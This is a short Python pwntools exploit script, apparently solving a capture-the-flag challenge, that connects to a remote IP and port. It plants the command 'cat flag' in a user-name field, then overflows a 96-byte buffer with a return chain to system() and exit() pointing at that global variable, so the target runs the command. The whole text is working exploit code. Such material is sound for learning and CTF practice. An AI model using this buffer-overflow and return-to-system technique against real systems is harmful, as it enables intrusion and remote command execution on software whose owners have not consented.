from pwn import *

def recv_all(p:remote):
    for _ in (range(10)):
        print(p.recvline(timeout=0.1))

# Open program
p = remote("51.15.171.241", 9006)
# p = remote("localhost", 9000)

# PB 1
user_name = b'cat flag\x00'
user_name += b'A' * (22 - len(user_name))
p.sendline(user_name)
recv_all(p)
p.sendline(b'2')
recv_all(p)

#Â PB 2
name = b'B' * 96
name += p32(0x80490b0) # system
name += p32(0x80490c0) # exit
name += p32(0x0804c06c) # user global var

p.sendline(name)
val = b'1'
p.sendline(val)

recv_all(p)

